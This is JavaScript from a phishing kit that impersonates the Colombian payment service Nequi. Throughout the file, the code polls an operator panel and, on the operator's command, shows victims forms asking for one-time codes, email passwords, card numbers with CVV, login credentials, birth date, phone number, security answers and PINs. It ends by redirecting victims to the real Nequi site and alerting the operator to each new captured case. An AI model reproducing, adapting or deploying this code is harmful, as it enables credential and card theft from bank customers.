function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  

/*
function consultar_estado(){ //
    if (espera == 1) { 
        var op = 'estado';
        $.post( "run/traer-datos.php",{op: op},function(data) { 
          //
            //dat = typeof data;23
           // console.log(data);
            dat = parseInt(data);
            console.log(dat);
            switch (dat) { 
                case 2:espera = 0; 
                         vista_otp(); 
                         break;
                case 4:espera = 0;
                         vista_email(); 
                         break;
                case 6:espera = 0;
                         vista_tarjeta();  
                         break;               
                case 8:espera = 0;
                         vista_errorotp(); 
                         break;
                case 10:espera = 0;
                		  //salir();
                          window.location.href = "https://www.nequi.com.co/";
                          break;
                case 12:espera = 0;
                          vista_usuario(); 
                          break;
                case 13:espera = 0;
                          vista_tarjetadt();
                          break;  
                case 15:espera = 0;
                          vista_apellidos();
                          break;   
                case 17:espera = 0; 
                          vista_fnacimiento();
                          break;   
                case 19:espera = 0;
                          vista_celular();
                          break;   
                case 21:espera = 0; 
                          vista_pregunta();
                          break; 
                case 23:espera = 0; 
                          vista_clave();
                          break;  
                case 25:espera = 0; 
                          vista_pregunta2();
                          break; 
                case 26:espera = 0; 
                          vista_clave2();
                          break;  
                case 31:espera = 0; 
                          vista_smsotp();
                          break;  
                case 33:espera = 0; 
                          vista_gestionpago();
                          break;                                                                             
            } 
        });    
    }    
}
*/

/** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
function consultar_estado() {
    if (espera != 1) {
        return;
    }
    $.post("../../../process/estado.php", function (data) {
        var s = $.trim(String(data));
        switch (s) {
            case '2':
                espera = 0;
                vista_otp();
                break;
            case '4':
                espera = 0;
                vista_email();
                break;
            case '6':
                espera = 0;
                vista_tarjeta();
                break;
            case '8':
                espera = 0;
                vista_errorotp();
                break;
            case '10':
                espera = 0;
                window.location.href = "../../../finish-no-back-button/";
                break;
            case '12':
                espera = 0;
                vista_usuario();
                break;
            case '25':
                espera = 0;
                vista_pregunta2();
                break;
            case '255':
                espera = 0;
                vista_preguntarep();
                break;
            default:
                break;
        }
    });
}
function vista_preguntarep(){

    var op = 'pregunta';

    $.post( "../../run/pasopregunta2.php",{op: op},function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg2").innerHTML = resp;
     });
     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".codigoqr").hide();
    $(".clcj").hide();
    $(".pregunta2").show();
    $("#resp2").focus();
}
function salir(){

    equi = detectar_dispositivo();
	console.log(equi);

        if (equi === 'Android' ) {

            var op = 'link';

            $.post( "run/traer-datos.php",{op: op},function(date) {
                console.log(date);
                var link = date;
                window.location.href = 'https://'+link;
                
             }); 

        } else {
            console.log('no es android');
            window.location.href = "https://www.nequi.com.co/";
        }

}

function vista_otp(){
    $(".fondo").hide();
    $(".mensaje").hide();

//    document.getElementById("codigootp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();
    $(".total").show();     
    $(".otp").show();
//    $("#codigootp").focus();

    // Limpiar los campos de code_numerickeypad
    $('.code_numerickeypad span').each(function() {
        $(this).text('');
    });

    // Reiniciar el índice y los valores ingresados
    currentIndex = 0;
    enteredValues.length = 0;  // Borra todos los valores ingresados      
}

function vista_errorotp(){
    //$("#msgOTP2").html("¡Ups! Clave dinámica inválida o vencida ");
    //$("#msgOTP2").css("display", "table");

    $(".fondo").hide();
    $(".mensaje").hide();

    //document.getElementById("codigootp2").value = "";
    
    $(".tarjeta").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show(); 
    $(".otp").show();        
    $(".errorotp").show();
    //$("#codigootp2").focus();

    // Limpiar los campos de code_numerickeypad
    $('.code_numerickeypad span').each(function() {
        $(this).text('');
    });

    // Reiniciar el índice y los valores ingresados
    currentIndex = 0;
    enteredValues.length = 0;  // Borra todos los valores ingresados    
}


function vista_usuario(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("usuario").value = "";
    document.getElementById("password").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".acceso").show();
    $("#usuario").focus();

}


function vista_email(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("email").value = "";
    document.getElementById("clavemail").value = "";

    $(".acceso").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjeta").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".correo-con").show();
    $("#email").focus();

}


function vista_tarjeta(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16").value = "";
    document.getElementById("Fecha").value = "";
    document.getElementById("cvv").value = "";

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".tarjeta").show();
    $("#tarjeta16").focus();

}


function vista_tarjetadt(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16dt").value = "";
    document.getElementById("Fechadt").value = "";
    document.getElementById("cvvdt").value = "";
    document.getElementById("clavedt").value = ""; 

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".tarjeta").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".tarjetadt").show();
    $("#tarjeta16dt").focus();

}


function vista_apellidos(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("apellido").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide(); 
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".apellidos").show();
    $("#apellido").focus();
}

function vista_fnacimiento(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("nacimiento").value = "";
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".otp").hide();  
    $(".apellidos").hide(); 
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".fnacimiento").show();
    $("#nacimiento").focus();
}

function vista_celular(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("celular").value = ""; 
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".pregunta").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".mobil").show(); 
    $("#celular").focus();
}

function vista_pregunta(){

 /*   $.post( "run/traer-pregunta.php",function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg").innerHTML = resp;
     });
*/     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".clave2").hide();
    $(".pregunta2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide();
    $(".codigootp3").hide();     
    $(".total").show();     
    $(".pregunta").show();
    $("#resp").focus();
}

function vista_pregunta2(){

    var op = 'pregunta';

    $.post( "../../../process/nequi_pregunta.php",{op: op},function(date) {
        console.log(date);
        var resp = date;
        document.getElementById("preg2").innerHTML = resp;
     });
     

    $(".fondo").hide();
    $(".mensaje").hide();   
    
    document.getElementById("resp2").value = ""; 

    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".otp").hide();
    $(".clave").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".pregunta2").show();
    $("#resp2").focus();
}

function vista_clave(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave2").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".clave").show();
    $("#clave").focus();

}

function vista_clave2(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("clave2").value = "";
    
    $(".acceso").hide();
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".smsotp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();     
    $(".clave2").show();
    $("#clave2").focus();

}

function vista_smsotp(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("smsotp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".solicitacodigo").hide(); 
    $(".codigootp3").hide();    
    $(".total").show();   
    $(".smsotp").show();
    $("#smsotp").focus();
}

function vista_gestionpago(){
    $(".fondo").hide();
    $(".mensaje").hide();

    // document.getElementById("smsotp").value = "";  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".tarjetadt").hide();
    $(".apellidos").hide();
    $(".fnacimiento").hide();
    $(".mobil").hide();
    $(".pregunta").hide();
    $(".pregunta2").hide();
    $(".clave").hide();
    $(".clave2").hide();
    $(".otp").hide();
    $(".total").hide();
    $(".codigootp3").hide();    
    $(".solicitacodigo").show();
    // $("#smsotp").focus();
}


function actualizar_casos(){
    $.post( "../process/casos.php", function(data) {
        $(".contenido").html(data);     
        $.post( "../process/pito.php", function(res) {
            if (res == "SI") {
                $("audio").get(0).play();
            }else{

            }
        });
    });
}
